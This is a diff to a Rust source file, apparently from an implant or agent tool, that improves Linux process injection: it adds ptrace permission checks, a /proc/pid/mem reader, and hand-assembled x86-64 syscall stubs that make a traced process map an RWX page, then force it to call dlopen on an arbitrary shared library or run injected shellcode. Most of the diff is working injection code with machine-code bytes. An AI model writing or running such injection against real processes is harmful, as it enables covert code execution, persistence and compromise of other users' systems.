@@ -2022,6 +2022,12 @@ async fn inject_shellcode_into_pid(pid: u32, shellcode: &[u8]) -> u32 {
 
     let pid_i32 = pid as i32;
 
+    // Pre-flight: check if ptrace is permitted by Yama / capabilities.
+    if !check_ptrace_permission(pid) {
+        tracing::warn!(pid, "ptrace not permitted (check /proc/sys/kernel/yama/ptrace_scope)");
+        return INJECT_ERROR_FAILED;
+    }
+
     // PTRACE_ATTACH
     // SAFETY: ptrace with PTRACE_ATTACH on a valid PID. We check the return value.
     let ret = unsafe { libc::ptrace(libc::PTRACE_ATTACH, pid_i32, 0, 0) };
@@ -2269,15 +2275,25 @@ async fn inject_so_into_pid(pid: u32, so_bytes: &[u8]) -> u32 {
 /// Use ptrace to make a target process call `dlopen` on a shared library path.
 ///
 /// Strategy:
-/// 1. Attach via ptrace.
-/// 2. Find the base address of libc in the target via `/proc/<pid>/maps`.
-/// 3. Find `__libc_dlopen_mode` offset by scanning our own libc.
-/// 4. Write the .so path string and a `call dlopen; int3` stub into the
-///    target's stack region.
-/// 5. Set RIP to the stub and resume.
-/// 6. Wait for the `int3` trap, restore original registers, detach.
+/// 1. Check ptrace permission (Yama scope).
+/// 2. Attach via ptrace.
+/// 3. Find the base address of libc in the target via `/proc/<pid>/maps`.
+/// 4. Find `__libc_dlopen_mode` offset by scanning our own libc.
+/// 5. Allocate an anonymous mmap page in the target (via a syscall stub)
+///    to hold the shellcode and path — avoids the System V red zone which
+///    can be clobbered by signals or interrupts.
+/// 6. Write the .so path string and a `call dlopen; int3` stub into the
+///    mmap'd page.
+/// 7. Set RIP to the stub and resume.
+/// 8. Wait for the `int3` trap, unmap the page, restore registers, detach.
 async fn inject_so_via_ptrace(pid: u32, so_path: &str) -> u32 {
     let pid_i32 = pid as i32;
+
+    // Pre-flight: check if ptrace is permitted by Yama / capabilities.
+    if !check_ptrace_permission(pid) {
+        tracing::warn!(pid, "ptrace not permitted (check /proc/sys/kernel/yama/ptrace_scope)");
+        return INJECT_ERROR_FAILED;
+    }
 
     // PTRACE_ATTACH
     // SAFETY: ptrace with valid PID. Return value checked.
@@ -2331,28 +2347,42 @@ async fn inject_so_via_ptrace(pid: u32, so_path: &str) -> u32 {
         return INJECT_ERROR_FAILED;
     }
 
-    // We'll write the path string and a small stub on the stack (below RSP).
-    // Layout (growing downward):
-    //   RSP - 256: path string (null-terminated)
-    //   RSP - 128: stub code
-    let path_addr = orig_regs.rsp.wrapping_sub(256);
-    let stub_addr = orig_regs.rsp.wrapping_sub(128);
+    // Allocate a fresh anonymous RWX page in the target via a mmap syscall
+    // stub.  This avoids writing into the System V x86-64 red zone (128 bytes
+    // below RSP) which can be clobbered by signal delivery or hardware
+    // interrupts between our POKE and SETREGS calls.
+    let page_addr = match ptrace_mmap_page(pid, &orig_regs) {
+        Some(addr) => addr,
+        None => {
+            tracing::warn!(pid, "failed to allocate mmap page in target");
+            // SAFETY: detach.
+            unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
+            return INJECT_ERROR_FAILED;
+        }
+    };
+
+    // Layout inside the mmap'd page:
+    //   page_addr + 0:    dlopen stub code
+    //   page_addr + 256:  null-terminated .so path string
+    let path_offset: u64 = 256;
+    let path_addr = page_addr + path_offset;
+    let stub_addr = page_addr;
 
     // Write the .so path string at path_addr.
     let mut path_bytes = so_path.as_bytes().to_vec();
     path_bytes.push(0); // null terminator
-    let write_result = write_to_proc_mem(pid, path_addr, &path_bytes);
-    if write_result.is_err() {
-        tracing::warn!(pid, "failed to write path to target memory");
+    if write_to_proc_mem(pid, path_addr, &path_bytes).is_err() {
+        tracing::warn!(pid, "failed to write path to mmap page");
+        ptrace_munmap_page(pid, &orig_regs, page_addr);
         // SAFETY: detach.
         unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
         return INJECT_ERROR_FAILED;
     }
 
     // Build x86_64 stub:
-    //   lea rdi, [rip + path_addr]   ; path (we'll use absolute mov instead)
-    //   mov rsi, RTLD_NOW (2)
-    //   mov rax, dlopen_addr
+    //   mov rdi, path_addr            ; first arg = path
+    //   mov rsi, RTLD_NOW (2)         ; second arg = flags
+    //   mov rax, dlopen_addr          ; function address
     //   call rax
     //   int3                          ; trap so we can restore
     let mut stub: Vec<u8> = Vec::new();
@@ -2370,19 +2400,21 @@ async fn inject_so_via_ptrace(pid: u32, so_path: &str) -> u32 {
     // int3
     stub.push(0xcc);
 
-    let write_result = write_to_proc_mem(pid, stub_addr, &stub);
-    if write_result.is_err() {
-        tracing::warn!(pid, "failed to write stub to target memory");
+    if write_to_proc_mem(pid, stub_addr, &stub).is_err() {
+        tracing::warn!(pid, "failed to write dlopen stub to mmap page");
+        ptrace_munmap_page(pid, &orig_regs, page_addr);
         // SAFETY: detach.
         unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
         return INJECT_ERROR_FAILED;
     }
 
-    // Set RIP to the stub and align RSP.
+    // Set RIP to the stub. Use a separate stack area within the mmap page
+    // (top of the page, 16-byte aligned) so we don't touch the target's stack.
     let mut new_regs = orig_regs;
     new_regs.rip = stub_addr;
-    // Ensure stack is 16-byte aligned for the call.
-    new_regs.rsp = orig_regs.rsp.wrapping_sub(512) & !0xf;
+    // Place RSP at the end of the page (4096), 16-byte aligned, leaving room
+    // for the call instruction to push a return address.
+    new_regs.rsp = (page_addr + 4096) & !0xf;
 
     // SAFETY: PTRACE_SETREGS with valid pid.
     let ret = unsafe {
@@ -2390,6 +2422,7 @@ async fn inject_so_via_ptrace(pid: u32, so_path: &str) -> u32 {
     };
     if ret < 0 {
         tracing::warn!(pid, "ptrace SETREGS failed: {}", std::io::Error::last_os_error());
+        ptrace_munmap_page(pid, &orig_regs, page_addr);
         // SAFETY: detach.
         unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
         return INJECT_ERROR_FAILED;
@@ -2403,6 +2436,9 @@ async fn inject_so_via_ptrace(pid: u32, so_path: &str) -> u32 {
     let mut trap_status: i32 = 0;
     // SAFETY: waitpid with valid pid.
     unsafe { libc::waitpid(pid_i32, &mut trap_status, 0) };
+
+    // Clean up: unmap the page, restore registers, detach.
+    ptrace_munmap_page(pid, &orig_regs, page_addr);
 
     // Restore original registers.
     // SAFETY: PTRACE_SETREGS with valid pid and original register state.
@@ -2427,6 +2463,247 @@ fn write_to_proc_mem(pid: u32, addr: u64, data: &[u8]) -> std::io::Result<()> {
     file.seek(SeekFrom::Start(addr))?;
     file.write_all(data)?;
     Ok(())
+}
+
+/// Read data from a target process's memory via `/proc/<pid>/mem`.
+fn read_from_proc_mem(pid: u32, addr: u64, len: usize) -> std::io::Result<Vec<u8>> {
+    use std::io::{Seek, SeekFrom};
+
+    let mem_path = format!("/proc/{pid}/mem");
+    let mut file = fs::OpenOptions::new().read(true).open(mem_path)?;
+    file.seek(SeekFrom::Start(addr))?;
+    let mut buf = vec![0u8; len];
+    file.read_exact(&mut buf)?;
+    Ok(buf)
+}
+
+/// Check whether ptrace is permitted on this system.
+///
+/// Reads `/proc/sys/kernel/yama/ptrace_scope` and returns `true` if injection
+/// is feasible:
+///   - 0 (classic): any process can ptrace any other (same UID)
+///   - 1 (restricted): only descendants, but we can still attach if we are root
+///     or the target called `prctl(PR_SET_PTRACER, ...)`
+///   - 2 (admin-only): only CAP_SYS_PTRACE holders
+///   - 3 (disabled): ptrace completely disabled
+///
+/// We check our effective UID and capabilities to decide. If Yama is not
+/// present (file missing), we assume classic mode (allowed).
+fn check_ptrace_permission(target_pid: u32) -> bool {
+    // Check Yama ptrace_scope.
+    let scope = match fs::read_to_string("/proc/sys/kernel/yama/ptrace_scope") {
+        Ok(s) => s.trim().parse::<u32>().unwrap_or(0),
+        Err(_) => 0, // No Yama — classic mode.
+    };
+
+    let euid = unsafe { libc::geteuid() };
+    let is_root = euid == 0;
+
+    match scope {
+        0 => true, // Classic — allowed for same UID.
+        1 => {
+            // Restricted. Root can always attach. Non-root can attach to
+            // descendants or prctl-opted targets. We attempt it and let
+            // PTRACE_ATTACH fail if not permitted rather than blocking
+            // outright, but warn.
+            if !is_root {
+                tracing::debug!(
+                    target_pid,
+                    "yama ptrace_scope=1: ptrace restricted to descendants; \
+                     injection may fail if target is not a descendant"
+                );
+            }
+            true
+        }
+        2 => {
+            // Admin-only. Check if we have CAP_SYS_PTRACE.
+            if is_root {
+                true
+            } else {
+                // Check effective capabilities for CAP_SYS_PTRACE (bit 19).
+                match fs::read_to_string("/proc/self/status") {
+                    Ok(status) => {
+                        for line in status.lines() {
+                            if let Some(hex) = line.strip_prefix("CapEff:\t") {
+                                if let Ok(caps) = u64::from_str_radix(hex.trim(), 16) {
+                                    // CAP_SYS_PTRACE = bit 19
+                                    return caps & (1 << 19) != 0;
+                                }
+                            }
+                        }
+                        false
+                    }
+                    Err(_) => false,
+                }
+            }
+        }
+        3 => {
+            tracing::warn!("yama ptrace_scope=3: ptrace is completely disabled");
+            false
+        }
+        _ => {
+            tracing::warn!(scope, "unknown yama ptrace_scope value");
+            false
+        }
+    }
+}
+
+/// Allocate an anonymous RWX page in a stopped tracee by executing a
+/// `mmap(NULL, 4096, PROT_RWX, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)` syscall
+/// stub at the current RIP, then restoring the original bytes.
+///
+/// Returns the base address of the mapped page, or `None` on failure.
+/// The tracee must already be stopped (PTRACE_ATTACH + waitpid done).
+fn ptrace_mmap_page(pid: u32, regs: &libc::user_regs_struct) -> Option<u64> {
+    let pid_i32 = pid as i32;
+    let rip = regs.rip;
+
+    // Build x86_64 syscall stub for mmap:
+    //   mov rax, 9          ; __NR_mmap
+    //   xor rdi, rdi        ; addr = NULL
+    //   mov rsi, 0x1000     ; len = 4096
+    //   mov rdx, 7          ; prot = PROT_READ|PROT_WRITE|PROT_EXEC
+    //   mov r10, 0x22       ; flags = MAP_PRIVATE|MAP_ANONYMOUS
+    //   mov r8, -1 (0xFFFFFFFFFFFFFFFF) ; fd = -1
+    //   xor r9, r9          ; offset = 0
+    //   syscall
+    //   int3                ; trap back to us
+    let mut stub: Vec<u8> = Vec::new();
+    // mov rax, 9
+    stub.extend_from_slice(&[0x48, 0xc7, 0xc0, 0x09, 0x00, 0x00, 0x00]);
+    // xor rdi, rdi
+    stub.extend_from_slice(&[0x48, 0x31, 0xff]);
+    // mov rsi, 0x1000
+    stub.extend_from_slice(&[0x48, 0xc7, 0xc6, 0x00, 0x10, 0x00, 0x00]);
+    // mov rdx, 7
+    stub.extend_from_slice(&[0x48, 0xc7, 0xc2, 0x07, 0x00, 0x00, 0x00]);
+    // mov r10, 0x22
+    stub.extend_from_slice(&[0x49, 0xc7, 0xc2, 0x22, 0x00, 0x00, 0x00]);
+    // mov r8, -1
+    stub.extend_from_slice(&[0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff]);
+    // xor r9, r9
+    stub.extend_from_slice(&[0x4d, 0x31, 0xc9]);
+    // syscall
+    stub.extend_from_slice(&[0x0f, 0x05]);
+    // int3
+    stub.push(0xcc);
+
+    let stub_len = stub.len();
+
+    // Save original bytes at RIP.
+    let orig_bytes = match read_from_proc_mem(pid, rip, stub_len) {
+        Ok(b) => b,
+        Err(e) => {
+            tracing::warn!(pid, %e, "failed to read original bytes at RIP for mmap stub");
+            return None;
+        }
+    };
+
+    // Write the mmap stub at RIP.
+    if let Err(e) = write_to_proc_mem(pid, rip, &stub) {
+        tracing::warn!(pid, %e, "failed to write mmap stub at RIP");
+        return None;
+    }
+
+    // Execute: PTRACE_CONT, wait for SIGTRAP from int3.
+    // SAFETY: valid pid, tracee is stopped.
+    unsafe { libc::ptrace(libc::PTRACE_CONT, pid_i32, 0, 0) };
+    let mut status: i32 = 0;
+    unsafe { libc::waitpid(pid_i32, &mut status, 0) };
+
+    // Read RAX — the mmap return value.
+    let mut post_regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
+    let ret = unsafe {
+        libc::ptrace(
+            libc::PTRACE_GETREGS,
+            pid_i32,
+            0,
+            &mut post_regs as *mut libc::user_regs_struct,
+        )
+    };
+    if ret < 0 {
+        tracing::warn!(pid, "GETREGS after mmap stub failed");
+        // Restore original bytes best-effort.
+        let _ = write_to_proc_mem(pid, rip, &orig_bytes);
+        return None;
+    }
+
+    let page_addr = post_regs.rax;
+
+    // MAP_FAILED = (void *)-1 = 0xFFFFFFFFFFFFFFFF
+    if page_addr == u64::MAX {
+        tracing::warn!(pid, "mmap syscall in target returned MAP_FAILED");
+        let _ = write_to_proc_mem(pid, rip, &orig_bytes);
+        return None;
+    }
+
+    // Restore original bytes at RIP.
+    if let Err(e) = write_to_proc_mem(pid, rip, &orig_bytes) {
+        tracing::warn!(pid, %e, "failed to restore original bytes after mmap stub");
+        // The page is allocated but we can't clean up — proceed anyway.
+    }
+
+    // Restore original register state (RIP, etc.).
+    // SAFETY: valid pid, regs struct.
+    unsafe {
+        libc::ptrace(libc::PTRACE_SETREGS, pid_i32, 0, regs as *const libc::user_regs_struct);
+    }
+
+    Some(page_addr)
+}
+
+/// Deallocate a page previously allocated with `ptrace_mmap_page` by executing
+/// a `munmap` syscall stub in the tracee. Best-effort — failure is logged but
+/// not fatal.
+fn ptrace_munmap_page(pid: u32, regs: &libc::user_regs_struct, page_addr: u64) {
+    let pid_i32 = pid as i32;
+    let rip = regs.rip;
+
+    // Build x86_64 syscall stub for munmap(page_addr, 4096):
+    //   mov rax, 11         ; __NR_munmap
+    //   movabs rdi, page_addr
+    //   mov rsi, 0x1000     ; len = 4096
+    //   syscall
+    //   int3
+    let mut stub: Vec<u8> = Vec::new();
+    // mov rax, 11
+    stub.extend_from_slice(&[0x48, 0xc7, 0xc0, 0x0b, 0x00, 0x00, 0x00]);
+    // movabs rdi, page_addr
+    stub.extend_from_slice(&[0x48, 0xbf]);
+    stub.extend_from_slice(&page_addr.to_le_bytes());
+    // mov rsi, 0x1000
+    stub.extend_from_slice(&[0x48, 0xc7, 0xc6, 0x00, 0x10, 0x00, 0x00]);
+    // syscall
+    stub.extend_from_slice(&[0x0f, 0x05]);
+    // int3
+    stub.push(0xcc);
+
+    let stub_len = stub.len();
+
+    // Save original bytes at RIP.
+    let orig_bytes = match read_from_proc_mem(pid, rip, stub_len) {
+        Ok(b) => b,
+        Err(e) => {
+            tracing::warn!(pid, %e, "failed to read bytes for munmap stub");
+            return;
+        }
+    };
+
+    if let Err(e) = write_to_proc_mem(pid, rip, &stub) {
+        tracing::warn!(pid, %e, "failed to write munmap stub");
+        return;
+    }
+
+    // SAFETY: valid pid, tracee is stopped.
+    unsafe { libc::ptrace(libc::PTRACE_CONT, pid_i32, 0, 0) };
+    let mut status: i32 = 0;
+    unsafe { libc::waitpid(pid_i32, &mut status, 0) };
+
+    // Restore original bytes and registers.
+    let _ = write_to_proc_mem(pid, rip, &orig_bytes);
+    unsafe {
+        libc::ptrace(libc::PTRACE_SETREGS, pid_i32, 0, regs as *const libc::user_regs_struct);
+    }
 }
 
 /// Find the base address of libc in a target process by parsing `/proc/<pid>/maps`.
@@ -6666,6 +6943,45 @@ mod tests {
         let addr = super::resolve_dlopen_in_target(libc_base);
         assert!(addr.is_some(), "should resolve dlopen in own process");
         assert!(addr.expect("checked") > libc_base, "dlopen should be past libc base");
+    }
+
+    /// `check_ptrace_permission` should return a boolean without panicking,
+    /// regardless of the system's Yama configuration.
+    #[test]
+    fn check_ptrace_permission_does_not_panic() {
+        // Use our own PID — we don't actually ptrace, just check permissions.
+        let result = super::check_ptrace_permission(std::process::id());
+        // On most CI/dev systems scope is 0 or 1, so this should be true.
+        // We don't assert the value since it depends on the system config,
+        // but we verify it doesn't panic.
+        let _ = result;
+    }
+
+    /// `check_ptrace_permission` returns false for scope=3 (disabled).
+    /// We can't easily change the real sysctl in a test, but we verify the
+    /// function reads the file and returns a sensible value for our own PID.
+    #[test]
+    fn check_ptrace_permission_returns_bool_for_own_pid() {
+        let allowed = super::check_ptrace_permission(std::process::id());
+        // Read the actual scope to know what to expect.
+        let scope = std::fs::read_to_string("/proc/sys/kernel/yama/ptrace_scope")
+            .map(|s| s.trim().parse::<u32>().unwrap_or(0))
+            .unwrap_or(0);
+        if scope == 3 {
+            assert!(!allowed, "scope=3 must deny ptrace");
+        }
+        // For scope 0/1, allowed should generally be true. For scope 2 it
+        // depends on capabilities. We just verify consistency with scope=3.
+    }
+
+    /// `read_from_proc_mem` can read bytes from our own process memory.
+    #[test]
+    fn read_from_proc_mem_reads_own_memory() {
+        let data: [u8; 8] = [0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE];
+        let addr = data.as_ptr() as u64;
+        let result = super::read_from_proc_mem(std::process::id(), addr, 8);
+        assert!(result.is_ok(), "should read own process memory");
+        assert_eq!(result.expect("checked"), data);
     }
 
     // ---- Windows-only command rejection tests ----
